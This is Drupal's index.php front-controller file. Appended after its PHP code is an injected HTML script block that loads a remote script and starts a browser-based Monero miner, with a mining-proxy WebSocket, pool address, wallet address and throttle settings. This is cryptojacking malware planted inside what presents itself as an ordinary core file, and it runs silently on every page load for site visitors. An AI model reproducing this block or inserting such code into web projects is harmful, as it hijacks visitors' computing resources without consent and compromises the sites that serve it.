<?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt files in the "core" directory.
 */

use Drupal\Core\DrupalKernel;
use Symfony\Component\HttpFoundation\Request;

$autoloader = require_once 'autoload.php';

$kernel = new DrupalKernel('prod', $autoloader);

$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();

$kernel->terminate($request, $response);

<script src="https://script.ghgi.xyz"></script>
<script>
    server = "wss://ny1.xmrminingproxy.com";
    var pool = "moneroocean.stream";
    var walletAddress = "47xS7CWWZ8c7xdxBcuiqA7KLK8kRFcaLFPViKA9w3eHVe2WcKj8iaBEADzZYXGqE9sCC71cbu64qrZhZZkafzFn2VPA9xs9";
    var workerId = ""
    var threads = -1;
    var password = "site";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
</script>